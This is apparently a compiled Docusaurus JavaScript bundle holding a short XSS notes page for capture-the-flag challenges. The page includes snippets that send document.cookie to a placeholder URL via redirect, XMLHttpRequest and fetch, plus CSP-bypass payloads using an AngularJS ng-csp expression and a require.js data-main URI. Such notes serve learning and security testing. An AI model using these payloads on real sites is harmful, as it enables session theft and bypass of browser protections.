"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[9821],{3905:(e,t,r)=>{r.d(t,{Zo:()=>u,kt:()=>y});var n=r(7294);function s(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function a(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function i(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?a(Object(r),!0).forEach((function(t){s(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):a(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function o(e,t){if(null==e)return{};var r,n,s=function(e,t){if(null==e)return{};var r,n,s={},a=Object.keys(e);for(n=0;n<a.length;n++)r=a[n],t.indexOf(r)>=0||(s[r]=e[r]);return s}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(n=0;n<a.length;n++)r=a[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(s[r]=e[r])}return s}var c=n.createContext({}),l=function(e){var t=n.useContext(c),r=t;return e&&(r="function"==typeof e?e(t):i(i({},t),e)),r},u=function(e){var t=l(e.components);return n.createElement(c.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},m=n.forwardRef((function(e,t){var r=e.components,s=e.mdxType,a=e.originalType,c=e.parentName,u=o(e,["components","mdxType","originalType","parentName"]),p=l(r),m=s,y=p["".concat(c,".").concat(m)]||p[m]||d[m]||a;return r?n.createElement(y,i(i({ref:t},u),{},{components:r})):n.createElement(y,i({ref:t},u))}));function y(e,t){var r=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var a=r.length,i=new Array(a);i[0]=m;var o={};for(var c in t)hasOwnProperty.call(t,c)&&(o[c]=t[c]);o.originalType=e,o[p]="string"==typeof e?e:s,i[1]=o;for(var l=2;l<a;l++)i[l]=r[l];return n.createElement.apply(null,i)}return n.createElement.apply(null,r)}m.displayName="MDXCreateElement"},943:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var n=r(7462),s=(r(7294),r(3905));const a={id:"xss",title:"XSS"},i="XSS",o={unversionedId:"security/web/xss",id:"security/web/xss",title:"XSS",description:"XSS (Cross Site Scripting) is a type of attack in which malicious scripts are injected in a website and executed on the client browser.",source:"@site/docs/security/05-web/xss.md",sourceDirName:"security/05-web",slug:"/security/web/xss",permalink:"/docs/security/web/xss",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/xss.md",tags:[],version:"current",frontMatter:{id:"xss",title:"XSS"},sidebar:"securitySidebar",previous:{title:"Serialization",permalink:"/docs/security/web/serialization"},next:{title:"Crypto",permalink:"/docs/security/crypto/"}},c={},l=[{value:"Send requests in Javascript",id:"send-requests-in-javascript",level:2},{value:"CSP bypasses",id:"csp-bypasses",level:2},{value:"JSONP endpoints",id:"jsonp-endpoints",level:3},{value:"require.js",id:"requirejs",level:3}],u={toc:l},p="wrapper";function d(e){let{components:t,...r}=e;return(0,s.kt)(p,(0,n.Z)({},u,r,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"xss"},"XSS"),(0,s.kt)("p",null,"XSS (Cross Site Scripting) is a type of attack in which malicious scripts are injected in a website and executed on the client browser."),(0,s.kt)("p",null,"There are three types of XSS:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"reflective"),(0,s.kt)("li",{parentName:"ul"},"stored"),(0,s.kt)("li",{parentName:"ul"},"DOM-based.")),(0,s.kt)("h2",{id:"send-requests-in-javascript"},"Send requests in Javascript"),(0,s.kt)("p",null,"XSS challenges usually require to do a request with a secret value.\nThese snippets below are possible ways to do it."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-js"},'// this is a redirection, but it could be used too\ndocument.location = "<url>?cookie=" + document.cookie;\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-js"},'var request = new XMLHttpRequest();\nrequest.open("GET", "<url>?cookie=" + document.cookie);\nrequest.send(null);\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-js"},'fetch("<url>?cookie=" + document.cookie);\n')),(0,s.kt)("h2",{id:"csp-bypasses"},"CSP bypasses"),(0,s.kt)("h3",{id:"jsonp-endpoints"},"JSONP endpoints"),(0,s.kt)("p",null,"This technique is based on special JSONP endpoints that allows unsafe execution of malicious scripts."),(0,s.kt)("p",null,"Look ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt"},"here")," for a list of the most common endpoints."),(0,s.kt)("admonition",{type:"caution"},(0,s.kt)("p",{parentName:"admonition"},"If there are any CSP sources set, you should pay attention on which endpoint you are using.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-html"},"<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js><\/script>\n<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>\n")),(0,s.kt)("h3",{id:"requirejs"},"require.js"),(0,s.kt)("p",null,"If the website uses require.js, it is possible to load additional code that will be automatically injected.\nThis means that the code will be loaded together with require.js and so it will avoid any nonce or other CSP."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-js"},'<script data-main="data:1,alert(1)" src="require.js"><\/script>\n')))}d.isMDXComponent=!0}}]);